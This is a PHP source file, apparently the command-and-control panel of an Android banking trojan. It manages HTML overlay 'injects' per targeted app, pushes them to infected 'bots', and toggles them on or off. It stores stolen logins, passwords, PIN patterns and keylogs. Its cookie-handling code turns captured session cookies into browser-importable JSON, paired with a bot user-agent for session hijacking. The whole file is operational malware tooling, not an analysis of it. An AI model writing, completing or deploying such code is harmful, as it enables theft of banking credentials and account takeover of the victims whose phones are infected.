<?php
require_once("helpers.php");

class Smarts
{
	public $db;
	public $lastError = "";
	public $lastMsg = "";
	
	function __construct($db)
	{
		$this->db = $db;
	}
	
	// let all bots to redownload injects
	function increment_version()
	{
		$sql = 'update config set value=value+1 where name="smarts_ver";';
		$this->db->fetch($sql);
	}
	
	function add_smart($type, $group, $package, $data, $cap_data, $icon, $is_active)
	{
		$data2 = $this->db->escape($data);
		$cap_data2 = $this->db->escape($cap_data);
		$icon2 = $this->db->escape($icon, true);
		$sql = "insert into smarts values(null, '{$type}', '{$group}', '{$package}', {$data2}, {$cap_data2}, {$icon2}, {$is_active})";
		
		$this->db->fetch($sql);
		if($this->db->getLastError() == "")
		{
			$this->increment_version();
			return true;
		}else{
			//dd($this->db->getLastError());
			return false;
		}
	}

	// mass toggle smart for all
	function toggle_global_all($val)
	{
		$sql = "update smarts set is_active={$val} where sgroup<>'specials';";
		$this->db->fetch($sql);

		if($this->db->getLastError() != "")
			return false;

		$sql = "update smarts_bots set is_active={$val} where sgroup<>'specials';";
		$this->db->fetch($sql);
		
		if($this->db->getLastError() != "")
			return false;

		return true;
	}

	// // enable/disable smart for all
	function toggle_global($smart_id, $val)
	{
		$smart_id = (int) $smart_id;
		$val = (int) $val;
		
		$sql = "update smarts set is_active={$val} where id={$smart_id}";
		$this->db->fetch($sql);
		
		if($this->db->getLastError() != "")
			return false;
			
		$sql = "update smarts_bots set is_active={$val} where smart_id={$smart_id}";
		$this->db->fetch($sql);
		
		if($this->db->getLastError() != "")
			return false;
		
		//$this->increment_version();
		return true;
	}
	
	// enable smart for the bot
	// target - package or smart_id
	function enable($bot_id, $target)
	{
		$bot_id2 = $this->db->escape($bot_id);
		
		if(strstr($target, ".")) // com.pkg
		{
			$pkg2 = $this->db->escape($target);
			
			$sql = "select id from smarts where package={$pkg2}";
			$res = $this->db->fetch($sql, true);
			if(!sizeof($res)) return false;
			
			$smart_id = $res[0]["id"];
		}else{
			$smart_id = (int) $target;
		}
		
		$sql = "INSERT into `smarts_bots`(id, smart_id, bot_id, is_active) values (NULL, {$smart_id}, {$bot_id2}, 1) ON DUPLICATE KEY UPDATE is_active=1;";
		$this->db->fetch($sql);
		return ($this->db->getLastError() == "");
	}

	function save($sid, $data, $cap_data, $file_icon)
	{
		$data2 = $this->db->escape(trim($data));
		$cap_data2 = $this->db->escape(trim($cap_data));
		
		$icon = "";
		if($file_icon['tmp_name'] != "" && $file_icon['error'] == 0)
		{
			$file = $file_icon['tmp_name'];
			
			if(endsWith(strtolower($file_icon['name']), ".png") && imagecreatefrompng($file))
			{
				$data = $this->db->escape(file_get_contents($file), true);
				$icon = ", icon={$data} ";
			}
		}
		
		$sql = "update smarts set data={$data2}, cap_data={$cap_data2} {$icon} where id={$sid}";
		$this->db->fetch($sql);

		if($this->db->getLastError() == "")
			$this->increment_version();
	}
	
	// disable smart for the bot
	// target - package or smart_id
	function disable($bot_id, $target)
	{
		$bot_id2 = $this->db->escape($bot_id);
		
		if(strstr($target, "."))
		{
			$pkg2 = $this->db->escape($target);
			
			$sql = "select id from smarts where package={$pkg2}";
			$res = $this->db->fetch($sql, true);
			if(!sizeof($res)) return;
			
			$smart_id = $res[0]["id"];
		}else{
			$smart_id = (int) $target;
		}
		
		$sql = "INSERT into `smarts_bots`(id, smart_id, bot_id, is_active) values (NULL, {$smart_id}, {$bot_id2}, 0) ON DUPLICATE KEY UPDATE is_active=0;";
		$this->db->fetch($sql);
		
		return ($this->db->getLastError() == "");
	}
	
	function api_save_data($bot_id, $pkg, $data)
	{
		//~ print("Save '{$data}' for '{$pkg}' of bot {$bot_id}\n");
		
		$pkg2 = $this->db->escape($pkg);
		$sql = "select id from smarts where package={$pkg2};";
		$res = $this->db->fetch($sql, true);
		
		if(!sizeof($res)) return;
		
		$smart_id = (int) $res[0]["id"];
		
		$bot_id2 = $this->db->escape($bot_id);
		$time = time();
		$data2 = $this->db->escape($data);
		
		$sql = "insert into smarts_data values(null, {$smart_id}, {$bot_id2}, {$time}, {$data2});";
		$this->db->fetch($sql);
	}
	
	function injects_to_enable($bot_id)
	{
		$bot_id2 = $this->db->escape($bot_id);
		
		$sql = "select package from smarts where id in(select smart_id from smarts_bots where bot_id={$bot_id2} and is_active=1);";
		$resOn = $this->db->fetch($sql, true);
		
		if(!sizeof($resOn)) return;
		
		$pkgs = [];
		foreach($resOn as $row)
			$pkgs[] = $row["package"];

		return implode(",", $pkgs);
	}
	
	function injects_to_disable($bot_id)
	{
		$bot_id2 = $this->db->escape($bot_id);
		
		$sql = "select package from smarts where id in(select smart_id from smarts_bots where bot_id={$bot_id2} and is_active=0);";
		$resOn = $this->db->fetch($sql, true);
		
		if(!sizeof($resOn)) return;
		
		$pkgs = [];
		foreach($resOn as $row)
			$pkgs[] = $row["package"];

		return implode(",", $pkgs);
	}
	
	// get array [[group]=>[pkg1, pkg2, ...], ...]
	function get_all_smarts($bot_id="")
	{
		$smarts = [];
		
		if($bot_id != "")
		{
			
		}else{
			$sql = "select sgroup, package from smarts order by id";
			$res = $this->db->fetch($sql, true);
		}
		
		if(!sizeof($res)) return [];
		
		foreach($res as $row)
		{
			$group = $row['sgroup'];
			if(!array_key_exists($group, $smarts)) 
				$smarts[$group] = [];
			
			$smarts[$group][] = $row['package'];
		}
		return $smarts;
	}
	
	// mode = size, data, list (see comments below)
	// $bot_id - varchar(36) or array of bot_ids
	// returns list:  [group => [pkg1, pkg2]]
	function get_bot_smarts($bot_id, $mode="data")
	{
		if(!is_array($bot_id))
		{
			$bot_id = [$bot_id];
		}
		
		$in = "";
		foreach($bot_id as $b)
			$in .= $this->db->escape($b) . ",";
		
		$in = substr($in, 0, strlen($in)-1);
		$sql = "SELECT apps from bots where bot_id in({$in})";
		$res = $this->db->fetch($sql, true);
		if(!sizeof($res)) return [];
		
		$apps = [];
		foreach($res as $row)
		{
			$apps = array_merge($apps, apps2array($row['apps']));
		}

		$apps_arr = array_unique($apps);
		
		if(!sizeof($apps_arr)) return [];
		$apps2 = "'".implode("','", $apps_arr)."'";
		
		if($mode == "size")
		{
			// no need to add Special injects or injects for apps that were deleted (but have logs)
			// we just show amount of real injects that are presented on the bot right now
			$sql = "SELECT count(id) from smarts WHERE package in({$apps2})";
			return $this->db->fetch($sql, true)[0]["count(id)"];
			
		}else if($mode == "data"){
			
			// get injects data for Bot Info # Injects tab

			# adds up injects for apps that has logs, but apps were deleted from the bot/s
			$apps_with_deleted = $apps;
			
			$sql = "select package from smarts where id in(select smart_id from smarts_data where bot_id in({$in}))";
			$res = $this->db->fetch($sql, true);
			if(sizeof($res))
			{
				foreach($res as $row)
					$apps_with_deleted[] = $row['package'];
				
				$apps_with_deleted = array_unique($apps_with_deleted);
			}

			# make sql
			$apps3 = "'".implode("','", $apps_with_deleted)."'";
			$sql = "SELECT id, stype, sgroup, package, data, cap_data, icon, is_active from smarts WHERE package in({$apps3}) or sgroup='specials';";
			$res = $this->db->fetch($sql, true);
			return $res;
			
		}else if($mode == "list"){
			# get list of injects for Show Inject command
			$sql = "SELECT sgroup, package from smarts WHERE package in({$apps2}) or sgroup='specials';";
			$res = $this->db->fetch($sql, true);
			
			if(!sizeof($res)) return [];
			
			$groups = [];
			foreach($res as $row)
			{
				if(!array_key_exists($row['sgroup'], $groups))
					$groups[$row['sgroup']] = [];
					
				$groups[$row['sgroup']][] = $row['package'];
			}
			
			return $groups;
		}
		
	}
	
	function api_get_injects($bot_id)
	{
		//~ print("Get injects for the bot {$bot_id}\n");
		
		$bot_id2 = $this->db->escape($bot_id);
		
		$sql = "SELECT apps from bots where bot_id={$bot_id2}";
		$res = $this->db->fetch($sql, true);
		
		$apps_arr = apps2array($res[0]['apps']);
		$apps2 = "'".implode("','", $apps_arr)."'";
		
		// select packages from smarts that are in bots.'apps' of the bot
		$sql = "SELECT stype, package, data, cap_data, icon, is_active from smarts WHERE package in({$apps2})";
		$res = $this->db->fetch($sql, true);

		// packages that are disabled for the bot
		$sql = "select package from smarts where id in(select smart_id from smarts_bots where bot_id={$bot_id2} and is_active=0);";
		$resOff = $this->db->fetch($sql, true);
		
		$disabled = [];
		if(sizeof($resOff)) foreach($resOff as $row)
			$disabled[] = $row['package'];
		
		// add injects from the 'specials' group
		$sql = "SELECT stype, package, data, cap_data, icon, is_active from smarts where sgroup='specials';";
		$res2 = $this->db->fetch($sql, true);
		
		$smarts = array_merge($res, $res2);
		if(!sizeof($smarts)) return "";
		
		$injects = [];
		foreach($smarts as $row)
		{
			// stype=html/url, package, data, cap_data, icon, is_active
			
			if($row['package'] == "") continue;
			// if(in_array($row['package'], $disabled)) continue; // disabled for the bot
			$inj = array();
			
			$inj['is_active'] = (bool) $row['is_active'];
			if(in_array($row['package'], $disabled))
				$inj['is_active'] = false;
			
			$inj['package'] = $row['package'];
			$inj['data'] = $row['data'];
			$inj['cap_data'] = $row['cap_data'];
			$inj['show_cap'] = (!$inj['is_active'] && $inj['cap_data'] != "")? true : false;
			
			if($row['stype'] == 'html')
			{
				$inj['type'] = 'html';
				if($row['is_active'] == 0 && $row['cap_data'] == "") continue;
				$inj['icon'] = base64_encode($row['icon']);
				
			}else{ // type = url
				$inj['type'] = 'url';
				if($row['is_active'] == 0) continue;
			}
			
			$injects[] = $inj;
		}
		
		return $injects;
	}

	function importZip($use_folders, $fixed_group_name, $zip_file)
	{
		//~ var_dump($use_folders);
		//~ var_dump($fixed_group_name);
		//~ var_dump($zip_file);
		
		$zip = new ZipArchive;
		if ($zip->open($zip_file) === true) {
			
			exec("rm -rf /tmp/files/");
			$zip->extractTo("/tmp/files/");
			$zip->close();
			$files = array_diff(scandir("/tmp/files"), array('..', '.', '__MACOSX'));
			
			if(!sizeof($files)) {
				$this->lastError = "No files found";
				return false;
			}
			
			$injects = []; // [group] => [inj => icon]
			$bodies_html = []; // filename => body
			$bodies_icon = []; // filename => body
			foreach($files as $file)
			{
				$path = "/tmp/files/{$file}";
				
				// dir
				if(is_dir($path))
				{
					$group = ($use_folders)? strtolower($file) : strtolower($fixed_group_name);
					if(!array_key_exists($group, $injects)) $injects[$group] = [];
					
					$files2 = array_diff(scandir($path), array('..', '.'));
					
					if(sizeof($files2)) 
					foreach($files2 as $file2)
					{
						// html, png, dir
						if(is_dir($path . "/" . $file2)) continue;
						if(!endsWith(strtolower($file2), ".png") && 
							!endsWith(strtolower($file2), ".html") && 
							!endsWith(strtolower($file2), ".htm")) continue;
						
						$injects[$group][] = $file2;
						if(endsWith(strtolower($file2), ".png") && imagecreatefrompng($path . "/" . $file2))
							$bodies_icon["{$group}_{$file2}"] = file_get_contents($path . "/" . $file2);
						else
							$bodies_html["{$group}_{$file2}"] = file_get_contents($path . "/" . $file2);
					}
				
				// html
				}else{
					
					if(!endsWith(strtolower($file), ".png") && 
							!endsWith(strtolower($file), ".html") && 
							!endsWith(strtolower($file), ".htm")) continue;
							
					$group = ($fixed_group_name != "")? $fixed_group_name : "custom";
					if(!array_key_exists($group, $injects)) $injects[$group] = []; 
					$injects[$group][] = $file;
					
					if(endsWith(strtolower($file), ".png") && imagecreatefrompng($path))
						$bodies_icon["{$group}_{$file}"] = file_get_contents($path);
					else
						$bodies_html["{$group}_{$file}"] = file_get_contents($path);
				}
				
			} // end foreach
			
			if(!sizeof($injects)) {
				$this->lastError = "No injects found";
				return false;
			}
			
			
			$success = 0;
			// $injects = [[group] => [file.html, file.png, file.htm]]
			// $bodies_html = ["group_file.html" => binary_body]
			// $bodies_icon = ["group_file.png" => binary_body]
			foreach($injects as $group=>$files)
			{
				foreach($files as $f)
				{
					if(!endsWith($f, ".html") && !endsWith($f, ".htm"))
						continue;
					
					$pkg = substr($f, 0, strpos($f, ".htm"));
					$f_png = $pkg . ".png";
					
					$body = $bodies_html["{$group}_{$f}"];
					$icon = (array_key_exists("{$group}_{$f_png}", $bodies_icon))? $bodies_icon["{$group}_{$f_png}"] : "";
					
					//print("PKG: {$pkg}; PNG: {$f_png}; BODY: " . strlen($body) . "; PNG: " . strlen($icon)."<br />");
					
					$group2 = $this->db->escape($group);
					$pkg2 = $this->db->escape($pkg);
					$body2 = $this->db->escape($body);
					$icon2 = $this->db->escape($icon, true);
					
					$sql = "insert into smarts values(null, 'html', {$group2}, {$pkg2}, {$body2}, '', {$icon2}, 1) on duplicate key update sgroup={$group2}, package={$pkg2}, data={$body2}, icon={$icon2};";
					//echo $sql."<br />";die;
					$this->db->fetch($sql);
					
					if($this->db->getLastError() == "")
						$success++;
				}
			}
			
		}
		
		if($success > 0)
		{
			$this->lastMsg = $success;
			$this->increment_version();
			return true;
		}else{
			$this->lastError = "Injects cannot be imported";
			return false;
		}

	}
	
	function formatLog($type, $group, $package, $text)
	{
		// type - html/url
		// group - specials
		// package - gmail, pattern, acsb
		
		// URL: https://www.google.com/search?q=url_test; COOKIES: 1P_JAR=2022-04-07-16; AEC=TC1CLfEE; NID=511=
		if(startsWith($text, "URL:"))
		{
			//$text = str_replace('COOKIES:', "\nCOOKIES:", $text);
			$parts = explode("COOKIES:", $text, 2);
			$parts[0] = trim(str_replace("URL:", "", $parts[0]));
			$parts[1] = trim($parts[1]);
			return $parts;
			
		// json inject submitted
		}else if(startsWith($text, "{") && endsWith($text, "}")){
			try{
				$data = json_decode($text, true);
				$out = "";
				if($data && sizeof($data))
				{
					foreach($data as $k=>$v)
					{
						$k = trim($k);
						$v = trim($v);
						
						if($k == "type_injects") continue;
						if($v == "close_activity_injects") continue;
						
						$out .= "{$k}: {$v}\n";
					}
					
					$text = $out;
				}
			}catch(Exception $e){
				
			}
		
		// field onblur
		}else if(startsWith($text, "Field:")){
			
			$text = str_replace('Value:', "\nValue:", $text);
		}
		
		// {"code":"->1->2->5->8->9","type_injects":"pincode","closed":"close_activity_injects"}
		// {"login":"test","password":"pass","type_injects":"banks","closed":"close_activity_injects"}
		// Field: ; Value: Ikikik
		
		return $text;
	}

	function getStatus($pkg, $is_active, $has_cap, $has_logs, $bot_apps=[])
	{
		
		if(array_key_exists($pkg, Bots::$special_statuses))
			return Bots::$special_statuses[$pkg];
		
		$uns = (sizeof($bot_apps) && !in_array($pkg, $bot_apps));
		
		// on
		// off - Why? - disabled / filled
		// cap - has/doesn't
		if($is_active == "1")
		{
			if($uns)
				$st = "<b><i>Uninstalled</i></b>";
			else
				$st = "<b style='color: blue'>Active</b>";
		}else{
			
			if($has_logs)
				$st = "<b style='color: green'>Has Logs</b>";
			else
				$st = "<b style='color: black'>Deactivated</b>";
			
			if($uns)
			{
				$st .= "; <b><i>Uninstalled</i></b>";
				return $st;
			}

			if($has_cap)
			{
				$st .= "; <b style='color: blue'>Shows Cap</b>";
			}else{
				$st .= "; <b style='color: black'>No Cap set</b>";
			}
		}

		return $st;
	}

	function getLogsTable($sid, $pkg, $bot_id_main="")
	{
		// for 1 bot
		if($bot_id_main != "")
		{
			$bot_id2 = $this->db->escape($bot_id_main);
			$sql = "select id, time, data from smarts_data where smart_id={$sid} and bot_id={$bot_id2}";
			$res = $this->db->fetch($sql, true);
			
			if(!sizeof($res)) return "";
			
			$bots_logs = [$bot_id_main => []];
			foreach($res as $row)
			{
				$bots_logs[$bot_id_main][] = [$row['id'], (int) $row['time'], $row['data']];
			}

		// for all bots
		}else{
			$sql = "select id, bot_id, time, data from smarts_data where smart_id={$sid} order by time desc";
			$res = $this->db->fetch($sql, true);
			
			if(!sizeof($res)) return "No logs yet";
			
			$bots_logs = [];
			foreach($res as $row)
			{
				$bot_id = $row['bot_id'];
				
				if(!array_key_exists($bot_id, $bots_logs)) 
					$bots_logs[$bot_id] = [];
				
				$bots_logs[$bot_id][] = [$row['id'], (int) $row['time'], $row['data']];
			}
		}
		
		$logs = "";
		foreach($bots_logs as $bot_id=>$rows)
		{
			$sz = sizeof($rows);
			$hide = ($sz > 10)? " style='display: none' " : "";
			
			if($bot_id_main == "") // if shows all bots - show bot info header
			{
				$sql = "select comment, country, tag from bots where bot_id='{$bot_id}'";
				$res = $this->db->fetch($sql, true);
				
				# COUNTRY FLAG
				$country_flag_path = "rc/flags/". strtoupper($res[0]['country']) . ".png";
				if(!file_exists($country_flag_path))
				{
					$country_flag_path = "rc/flags/_unknown.png";
				}
				
				$country = $res[0]['country'];
				$tag = $res[0]['tag'];
				
				$bot_deleted_hide = "";
				if(sizeof($res))
				{
					$comment = $res[0]['comment'];
				}else{
					$comment = "Bot was deleted";
					$bot_deleted_hide = " style='display: none' ";
				}
				
				if($comment != "") $comment = "&#151; " . $comment;
				
				$logs .= "<div class='row'>
					<div class='col-md-1'><br />
						<a {$bot_deleted_hide} title='Bot page' href='?a=admin&action=bots&bbot_id={$bot_id}&page=bot_page'>
						<button style='width: 50px' class='btn btn-primary btn-xs'><i class='flaticon-information-button' style='color: white'></i>
						</button></a>
						&nbsp;
						<img src='{$country_flag_path}' alt='Country: {$country}'  title='Country: {$country}' />
					</div>
					<div class='col-md-11'>
						<h3 onclick='$(\"#recordsTable_{$bot_id}_{$sid}\").toggle()'>
						<code style='font-size: 9pt'>{$tag}</code>
						<span style='text-decoration: underline'>Bot #{$bot_id}</span> ({$sz}) <i>{$comment}</i>
					</div>
				</div>";
				
			} // end bot header
			
			$logs .= "<span id='recordsTable_{$bot_id}_{$sid}' {$hide}>
			
			<div class='row'>
				<div class='col-md-1'><button class='btn btn-info btn-xs' onclick='select_all_logs(\"{$bot_id}_{$sid}\")'>Select&nbsp;all</button>
				<button class='btn btn-danger btn-xs' onclick='delete_mass_logs(\"{$sid}\", \"{$bot_id_main}\")'>delete</button>
				</div>
				<div class='col-md-2'></div>
				<div class='col-md-6'></div>
				<div class='col-md-3 text-right'><a {$bot_deleted_hide} href='?a=admin&action=logs&bot_id={$bot_id}&filter_text={$pkg}&autoload=1'<button type='button' class='btn btn-success btn-xs'>Parse keylogs</button></a></span></div>
			</div>
			<br />
			<table class='table table-bordered'>
			<tr>
				<th width='10'>Id</th>
				<th width='10'>Time</th>
				<th>Data</th>
			</tr>
			";
			
			$cookies = [];
			foreach($rows as $row)
			{
				$id = $row[0];
				$time = date_readable($row[1]);
				$data = $row[2];
				
				$logtext = $this->formatLog($type, $group, $pkg, $data);
				
				if(is_array($logtext)) // url and cookies
				{
					$host = parse_url($logtext[0], PHP_URL_HOST);
					$formattedLog = $host;
					$cookies[$host][] = $this->parse_cookies($logtext[1]);
					continue;
				}else{
					$formattedLog = htmlspecialchars($logtext);
				}
				
				$rows_sz = substr_count($formattedLog, "\n") + 2;
				if($rows_sz < 3) $rows_sz = 3;
				
				$logs .= "<tr onclick='toggle_check(\"chk{$id}\")'>
					<td><input id='chk{$id}' name='log_id[]' value='{$id}' title='{$id}' type='checkbox' /></td>
					<td>{$time}</td>
					<td style='text-align: left'><textarea style='width: 100%' rows='{$rows_sz}'>{$formattedLog}</textarea></td>
				</tr>";
			}

			if(sizeof($cookies))
			{
				$logs .= "<script>
				function show_text(rnd, type)
				{
					$('#txt_' + rnd + '_string').hide()
					$('#txt_' + rnd + '_json').hide()
					$('#txt_' + rnd + '_ua').hide()
					$('#txt_' + rnd + '_' + type).show()
				}
				</script>";
				
				foreach($cookies as $host => $cs)
				{
					$latest_cookies = [];
					
					foreach($cs as $bunch)
					{
						foreach($bunch as $key=>$val)
						{
							$latest_cookies[$key] = $val;
						}
					}
					
					$rnd = rand(10000,90000);
					$data = $this->cookies_to_string($latest_cookies);
					$data_json = $this->cookies_to_json($host, $latest_cookies);
					$logs .= "<tr>
						<td></td>
						<td>{$host}</td>
						<td style='text-align: left'>
						<button type='button' onclick='show_text({$rnd}, \"string\")' class='btn btn-xs btn-primary'>As String</button>
						<button type='button' onclick='show_text({$rnd}, \"json\")' class='btn btn-xs btn-success'>As JSON</button>
						<button type='button' onclick='show_text({$rnd}, \"ua\")' class='btn btn-xs btn-info'>Bot User-Agent</button>
						<br />
						<textarea id='txt_{$rnd}_string' onclick='this.select()' style='width: 100%; margin-top: 10px' rows='5'>{$data}</textarea>
						<textarea id='txt_{$rnd}_json' onclick='this.select()' style='width: 100%; margin-top: 10px; display: none' rows='5'>{$data_json}</textarea>
						<textarea id='txt_{$rnd}_ua' onclick='this.select()' style='width: 100%; margin-top: 10px; display: none' rows='2'>Mozilla/5.0 (iPhone android; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1</textarea>
						
						</td>
					</tr>";
				}
			}
			
			$logs .= "</table></span>";
		}
	
		return $logs;
	}
	
	function cookies_to_json($host, $arr)
	{
		$js_array = [];
		
		if(sizeof($arr))
		foreach($arr as $key=>$val)
		{
			$js_array[] = array(
				'domain' => $host,
				'name' => $key,
				'value' => $val,
				'path' => '/',
				'session' => 'false',
				'httpOnly' => 'false',
				'secure' => 'true',
				'expires' => '2147483647',
			);
		}

		return json_encode($js_array);
	}

	function cookies_to_string($arr)
	{
		if(!sizeof($arr)) return "";

		$s = "";
		foreach($arr as $key=>$val)
		{
			$s .= "{$key}={$val}; ";
		}
		
		return $s;
	}

	function parse_cookies($str)
	{
		$str = trim($str);
		
		if(!$str) return [];

		$cookies = [];
		foreach(explode(';', $str) as $v)
		{
			$v = trim($v);
			if(strstr($v, "="))
			{
				list($key, $val) = explode("=", $v, 2);
				$cookies[trim($key)] = trim($val);
			}else{
				$cookies[$v] = "";
			}
		}

		return $cookies;
	}
}

